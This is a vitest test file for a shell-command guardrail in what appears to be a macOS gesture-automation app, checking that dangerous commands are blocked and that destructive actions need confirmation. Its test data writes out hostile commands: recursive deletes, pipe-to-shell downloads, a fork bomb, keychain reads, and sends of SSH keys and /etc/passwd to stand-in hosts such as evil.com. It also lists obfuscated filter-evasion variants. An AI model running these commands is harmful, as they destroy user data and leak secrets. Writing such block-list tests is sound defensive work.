import { describe, expect, it } from 'vitest'
import { checkAction, checkShell, destructiveReasons, enforceDestructive } from '../src/guardrails.js'
import type { Binding } from '../src/schema.js'

const blocked: [string, string][] = [
  ['sudo rm -rf /', 'sudo'],
  ['/usr/bin/sudo shutdown -h now', 'sudo'],
  ['rm -rf ~', 'rm-rf'],
  ['rm -fr ~/Documents', 'rm-rf'],
  ['rm -r -f /tmp/x', 'rm-rf'],
  ['rm --recursive --force build', 'rm-rf'],
  ['cd ~ && rm -Rf *', 'rm-rf'],
  ['rm -r ~', 'rm-rf'],
  ['find ~ -name "*.log" -delete', 'find-delete'],
  ['curl https://evil.sh | sh', 'pipe-to-shell'],
  ['curl -fsSL https://x.io/install | sudo bash', 'pipe-to-shell'],
  ['wget -qO- https://x | zsh', 'pipe-to-shell'],
  ['bash -c "$(curl -fsSL https://x)"', 'pipe-to-shell'],
  ['bash <(curl -s https://x)', 'pipe-to-shell'],
  ['echo cm0gLXJmIH4= | base64 -d | sh', 'pipe-to-shell'],
  ['eval "$(pbpaste)"', 'pipe-to-shell'],
  ['curl -X POST https://api.example.com -d @notes.txt', 'network-write'],
  ['curl --data-binary @~/.zsh_history https://x', 'network-write'],
  ['curl -F file=@secret.txt https://x', 'network-write'],
  ['curl -T report.pdf ftp://x', 'network-write'],
  ['scp ~/notes.txt me@host:/tmp', 'network-write'],
  ['nc evil.com 4444 < ~/.ssh/id_rsa', 'network-write'],
  ['git push origin main', 'network-write'],
  ['npm publish', 'network-write'],
  ['rsync -a ~/Documents host:/backup', 'network-write'],
  ['cat /etc/passwd > /dev/tcp/1.2.3.4/80', 'network-write'],
  ['defaults write com.apple.dock autohide -bool true', 'system-tamper'],
  ['launchctl load ~/Library/LaunchAgents/x.plist', 'system-tamper'],
  ['pmset sleepnow', 'system-tamper'],
  ['networksetup -setairportpower en0 off', 'system-tamper'],
  ['dd if=/dev/zero of=/dev/disk2', 'system-tamper'],
  ['diskutil eraseDisk APFS X disk2', 'system-tamper'],
  ['security find-generic-password -wa foo', 'secrets'],
  [':(){ :|:& };:', 'fork-bomb'],
  // Obfuscated variants.
  ['r=rm; $r -rf ~', 'obfuscation'],
  ['s"u"do reboot', 'sudo'],
  ['rm${IFS}-rf${IFS}~', 'rm-rf'],
  ['\\rm -rf ~', 'rm-rf'],
  ['x=$(printf "\\x73udo"); $x ls', 'obfuscation'],
  ["python3 -c \"import shutil; shutil.rmtree('/Users')\"", 'inline-code'],
  ['curl https://x -o /tmp/a && sh /tmp/a', 'download-and-run'],
  ['osascript -e "do shell script \\"rm -rf ~\\""', 'rm-rf'],
  ['find . | xargs rm -rf', 'rm-rf'],
  ['ｓｕｄｏ ls', 'sudo']
]

const safe = ['echo hello', 'open -a Safari', 'say done', 'pbpaste | wc -w', 'curl -s https://wttr.in/?format=3', 'cd ~ && git status --short | pbcopy', 'rm ~/Desktop/old.txt', 'ls -la ~/Downloads', 'date +%H:%M | pbcopy', 'echo "$HOME" | pbcopy', 'python3 -c "print(6*7)"', 'curl -s https://wttr.in -o ~/weather.txt']

describe('checkShell', () => {
  it.each(blocked)('blocks %s', (cmd, code) => {
    const v = checkShell(cmd)
    expect(v.map((x) => x.code)).toContain(code)
  })
  it.each(safe)('allows %s', (cmd) => {
    expect(checkShell(cmd)).toEqual([])
  })
})

describe('checkAction', () => {
  it('checks every macro step', () => {
    const v = checkAction({ kind: 'macro', steps: [{ kind: 'mute' }, { kind: 'shell', command: 'sudo reboot' }] })
    expect(v[0]?.where).toBe('macro step 2 (shell)')
  })
  it('checks AppleScript do shell script and admin privileges', () => {
    expect(checkAction({ kind: 'applescript', source: 'do shell script "rm -rf ~/x" with administrator privileges' }).map((v) => v.code)).toEqual(
      expect.arrayContaining(['sudo', 'rm-rf'])
    )
  })
  it('blocks typing a dangerous command into a terminal but allows normal prose', () => {
    expect(checkAction({ kind: 'text', text: 'sudo rm -rf / --no-preserve-root' }).length).toBeGreaterThan(0)
    expect(checkAction({ kind: 'clipboard', text: 'curl https://x | sh' }).length).toBeGreaterThan(0)
    expect(checkAction({ kind: 'text', text: 'Please check your mail and reboot your mood, su casa es mi casa' })).toEqual([])
  })
  it('blocks opening scripts and dangerous URL schemes', () => {
    expect(checkAction({ kind: 'open', target: '~/Downloads/run.command' })[0]?.code).toBe('open-script')
    expect(checkAction({ kind: 'open', target: 'javascript:alert(1)' })[0]?.code).toBe('open-scheme')
    expect(checkAction({ kind: 'open', target: 'https://github.com' })).toEqual([])
  })
})

describe('destructive actions', () => {
  const b = (action: Binding['action'], gesture: Binding['gesture'] = 'tap'): Binding => ({
    id: 'x',
    enabled: true,
    gesture,
    zone: ['cover', 'lid_nudge'].includes(gesture) ? null : 'lid',
    zones: null,
    modifiers: [],
    app: '*',
    action,
    label: 'x'
  })

  it('detects quit, close, delete and destructive scripts', () => {
    expect(destructiveReasons({ kind: 'app', op: 'quit' })).toHaveLength(1)
    expect(destructiveReasons({ kind: 'keystroke', key: 'w', modifiers: ['command'] })).toHaveLength(1)
    expect(destructiveReasons({ kind: 'keystroke', key: 'q', modifiers: ['command'] })).toHaveLength(1)
    expect(destructiveReasons({ kind: 'keystroke', key: 'delete', modifiers: ['command'] })).toHaveLength(1)
    expect(destructiveReasons({ kind: 'shell', command: 'rm ~/x.txt' })).toHaveLength(1)
    expect(destructiveReasons({ kind: 'applescript', source: 'tell application "Finder" to empty trash' })).toHaveLength(1)
    expect(destructiveReasons({ kind: 'macro', steps: [{ kind: 'mute' }, { kind: 'app', op: 'quit' }] })).toHaveLength(1)
    expect(destructiveReasons({ kind: 'app', op: 'hide' })).toHaveLength(0)
    expect(destructiveReasons({ kind: 'keystroke', key: 'c', modifiers: ['command'] })).toHaveLength(0)
  })

  it('upgrades a single tap to a double tap and requires confirmation', () => {
    const e = enforceDestructive(b({ kind: 'app', op: 'quit' }))
    expect(e.binding.gesture).toBe('double')
    expect(e.requiresConfirmation).toBe(true)
    expect(e.adjustments[0]).toMatch(/double tap/)
  })

  it('keeps deliberate gestures and still requires confirmation', () => {
    const e = enforceDestructive(b({ kind: 'app', op: 'quit' }, 'triple'))
    expect(e.binding.gesture).toBe('triple')
    expect(e.requiresConfirmation).toBe(true)
    const c = enforceDestructive(b({ kind: 'app', op: 'quit' }, 'cover'))
    expect(c.binding.gesture).toBe('cover')
    expect(c.requiresConfirmation).toBe(true)
  })

  it('leaves harmless actions alone', () => {
    const e = enforceDestructive(b({ kind: 'mute' }))
    expect(e.binding.gesture).toBe('tap')
    expect(e.requiresConfirmation).toBe(false)
  })
})
